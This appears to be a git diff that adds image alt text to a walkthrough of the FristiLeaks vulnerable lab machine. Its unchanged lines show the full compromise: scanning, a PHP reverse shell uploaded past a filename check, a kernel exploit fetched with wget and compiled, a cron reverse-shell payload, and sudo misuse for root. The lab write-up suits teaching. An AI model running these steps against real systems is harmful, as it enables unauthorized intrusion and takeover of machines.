@@ -38,13 +38,13 @@ nmap -A -p- TARGET -T4 -oN leaks.nmap
 | -------- | ----------- |
 | 80       | http        |
 
-![](https://cdn.ziomsec.com/fristileaks/1.webp)
+![performing nmap scan on fristileaks machine](https://cdn.ziomsec.com/fristileaks/1.webp)
 
 ## Initial Foothold
 
 I visited the web application running on the target through my browser.
 
-![](https://cdn.ziomsec.com/fristileaks/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/fristileaks/2.webp)
 
 I then performed a **ffuf** scan to find hidden files on the web server.
 
@@ -52,7 +52,7 @@ I then performed a **ffuf** scan to find hidden files on the web server.
 ffuf -u http://TARGET/fuzz -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,302
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/3.webp)
+![fuzzing files on the web app](https://cdn.ziomsec.com/fristileaks/3.webp)
 
 **ffuf** identified 2 files. I navigated to *robots.txt* file to find more endpoints. 
 
@@ -60,7 +60,7 @@ ffuf -u http://TARGET/fuzz -w /usr/share/seclists/Discovery/Web-Content/raft-lar
 curl http://TARGET/robots.txt
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/4.webp)
+![accessing robots.txt](https://cdn.ziomsec.com/fristileaks/4.webp)
 
 I accessed the endpoints found through *robots.txt* but did not find anything.
 
@@ -70,48 +70,48 @@ $ curl http://TARGET/sisi
 $ curl http://TARGET/beer
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/5.webp)
+![accessing other discovered endpoints](https://cdn.ziomsec.com/fristileaks/5.webp)
 
-![](https://cdn.ziomsec.com/fristileaks/6.webp)
+![accessing other discovered endpoints](https://cdn.ziomsec.com/fristileaks/6.webp)
 
 Since none of the endpoints revealed anything, I tried using terms that were related to the VM ('fritisleaks', 'leaks', 'fristi' etc).
 - I found a login panel at the *fristi* endpoint.
 
-![](https://cdn.ziomsec.com/fristileaks/7.webp)
+![accessing other discovered endpoints](https://cdn.ziomsec.com/fristileaks/7.webp)
 
 The source code revealed a potential username and some base64 encoded data.
 
-![](https://cdn.ziomsec.com/fristileaks/8.webp)
+![viewing page source](https://cdn.ziomsec.com/fristileaks/8.webp)
 
-![](https://cdn.ziomsec.com/fristileaks/9.webp)
+![viewing page source](https://cdn.ziomsec.com/fristileaks/9.webp)
 
 I decoded this using a base64 decoder website. The header type revealed that this was an image.
 
-![](https://cdn.ziomsec.com/fristileaks/10.webp)
+![decoding base64 blob](https://cdn.ziomsec.com/fristileaks/10.webp)
 
 Since it was a PNG image, I used a base64 to PNG converter to gather more information about it.
 
-![](https://cdn.ziomsec.com/fristileaks/11.webp)
+![converting base64 to png](https://cdn.ziomsec.com/fristileaks/11.webp)
 
 I attempted to log in using *`eezeepz | keKkeKKeKKeKkEkkEk`* and successfully gained access.
 
-![](https://cdn.ziomsec.com/fristileaks/12.webp)
+![logging in as eezeepz](https://cdn.ziomsec.com/fristileaks/12.webp)
 
 I clicked on the *upload file* link and accessed a file upload functionality.
 
-![](https://cdn.ziomsec.com/fristileaks/13.webp)
+![file upload functionality](https://cdn.ziomsec.com/fristileaks/13.webp)
 
 I turned on Burp Suite and attempted to upload a text file, but encountered an error.
 
-![](https://cdn.ziomsec.com/fristileaks/14.webp)
+![uploading text file](https://cdn.ziomsec.com/fristileaks/14.webp)
 
 Upon changing the *filename*, I successfully uploaded the file.
 
-![](https://cdn.ziomsec.com/fristileaks/15.webp)
+![uploading text file](https://cdn.ziomsec.com/fristileaks/15.webp)
 
 Upon visiting the *Uploads/* directory, I received a text response.
 
-![](https://cdn.ziomsec.com/fristileaks/16.webp)
+![viewing uploaded file](https://cdn.ziomsec.com/fristileaks/16.webp)
 
 Since, I had the ability to upload any files, I uploaded a **php reverse shell** and triggered it to get a reverse shell.
 
@@ -121,15 +121,15 @@ Since, I had the ability to upload any files, I uploaded a **php reverse shell**
 rlwrap nc -lnvp 8000
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/17.webp)
+![starting a reverse shell listener](https://cdn.ziomsec.com/fristileaks/17.webp)
 
-![](https://cdn.ziomsec.com/fristileaks/18.webp)
+![uploading reverse shell payload](https://cdn.ziomsec.com/fristileaks/18.webp)
 
 ```shell
 curl http://TARGET/fristi/uploads/exploit.php.png
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/19.webp)
+![getting a reverse shell](https://cdn.ziomsec.com/fristileaks/19.webp)
 
 ## Privilege Escalation
 ### Kernel Exploitation
@@ -140,9 +140,9 @@ I viewed my kernel information and searched for exploits related to it on **Expl
 uname -a
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/20.webp)
+![viewing kernel info](https://cdn.ziomsec.com/fristileaks/20.webp)
 
-![](https://cdn.ziomsec.com/fristileaks/21.webp)
+![searching kernel exploits](https://cdn.ziomsec.com/fristileaks/21.webp)
 
 I downloaded the available exploit on the target system.
 
@@ -150,7 +150,7 @@ I downloaded the available exploit on the target system.
 wget http://KALI:PORT/exploit.c
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/22.webp)
+![downloading kernel exploit](https://cdn.ziomsec.com/fristileaks/22.webp)
 
 I then compiled it according to the instructions given in the payload script.
 
@@ -158,7 +158,7 @@ I then compiled it according to the instructions given in the payload script.
 gcc -pthread exploit.c -o dirty -lcrypt
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/23.webp)
+![compiling kernel exploit](https://cdn.ziomsec.com/fristileaks/23.webp)
 
 By executing the payload, a new user called *firefart* was added with a **uid** of 0.
 
@@ -168,7 +168,7 @@ $ su firefart
 # enter password
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/24.webp)
+![shell as firefart](https://cdn.ziomsec.com/fristileaks/24.webp)
 
 Hence, I gained root access.
 ### Using Misconfigured CRON
@@ -180,7 +180,7 @@ cd /var/www
 cat notes.txt
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/25.webp)
+![viewing notes.txt](https://cdn.ziomsec.com/fristileaks/25.webp)
 
 I navigated to the *eezeepz* directory and found another note.
 
@@ -189,21 +189,21 @@ cd /home/eezeepz
 cat notes.txt
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/26.webp)
+![viewing another note](https://cdn.ziomsec.com/fristileaks/26.webp)
 
 Hence, I added a payload to get a reverse shell in a file called *runthis*.
 
-![](https://cdn.ziomsec.com/fristileaks/27.webp)
+![adding payload to file run by cron](https://cdn.ziomsec.com/fristileaks/27.webp)
 
-![](https://cdn.ziomsec.com/fristileaks/28.webp)
+![adding payload to file run by cron](https://cdn.ziomsec.com/fristileaks/28.webp)
 
 After a couple of minutes, I got a reverse shell.
 
-![](https://cdn.ziomsec.com/fristileaks/29.webp)
+![getting a reverse shell](https://cdn.ziomsec.com/fristileaks/29.webp)
 
 I found encrypted data in the */home/admin* directory along with a Python script that encrypted it.
 
-![](https://cdn.ziomsec.com/fristileaks/30.webp)
+![viewing encrypted data and python script](https://cdn.ziomsec.com/fristileaks/30.webp)
 
 > - `base64string = base64.b64encode(str)` : encodes the string with base64.
 > - `codes.encode(base64string[::-1], 'rot13')` : reverses the base64 encoded string and then encodes it with rot13.
@@ -213,19 +213,19 @@ To decode this, I wrote a simple Python script. This script can be downloaded fr
 
 > The file owner also gave me a hint about whose password was stored in these files.
 
-![](https://cdn.ziomsec.com/fristileaks/31.webp)
+![viewing file owner](https://cdn.ziomsec.com/fristileaks/31.webp)
 
-![](https://cdn.ziomsec.com/fristileaks/32.webp)
+![running custom decoder](https://cdn.ziomsec.com/fristileaks/32.webp)
 
 I then switched to *fristigod*.
 
-![](https://cdn.ziomsec.com/fristileaks/33.webp)
+![switching to fristigod](https://cdn.ziomsec.com/fristileaks/33.webp)
 
 I found a binary running as **root** in */var/fristigod*
 
-![](https://cdn.ziomsec.com/fristileaks/34.webp)
+![viewing binary owned by root](https://cdn.ziomsec.com/fristileaks/34.webp)
 
-![](https://cdn.ziomsec.com/fristileaks/35.webp)
+![viewing binary owned by root](https://cdn.ziomsec.com/fristileaks/35.webp)
 
 I tried executing it using the syntax shown above.
 
@@ -233,7 +233,7 @@ I tried executing it using the syntax shown above.
 ./doCron id
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/36.webp)
+![executing binary owned by root](https://cdn.ziomsec.com/fristileaks/36.webp)
 
 I looked at the users available on the system by viewing the */etc/passwd* file.
 
@@ -241,7 +241,7 @@ I looked at the users available on the system by viewing the */etc/passwd* file.
 cat /etc/passwd
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/37.webp)
+![viewing system users](https://cdn.ziomsec.com/fristileaks/37.webp)
 
 This file revealed a user called *fristi*, so I tried executing the command using it.
 
@@ -250,7 +250,7 @@ sudo -u fristi ./doCron id
 # password revealed by custom python script.
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/38.webp)
+![executing binary as fristi](https://cdn.ziomsec.com/fristileaks/38.webp)
 
 Since this executed successfully, I used it to gain **root** access.
 
@@ -258,11 +258,11 @@ Since this executed successfully, I used it to gain **root** access.
 sudo -u fristi ./doCeon bash
 ```
 
-![](https://cdn.ziomsec.com/fristileaks/39.webp)
+![shell as root](https://cdn.ziomsec.com/fristileaks/39.webp)
 
 Finally, I captured the flag from */root*.
 
-![](https://cdn.ziomsec.com/fristileaks/40.webp)
+![capturing the root flag](https://cdn.ziomsec.com/fristileaks/40.webp)
 
 ## Closure
 
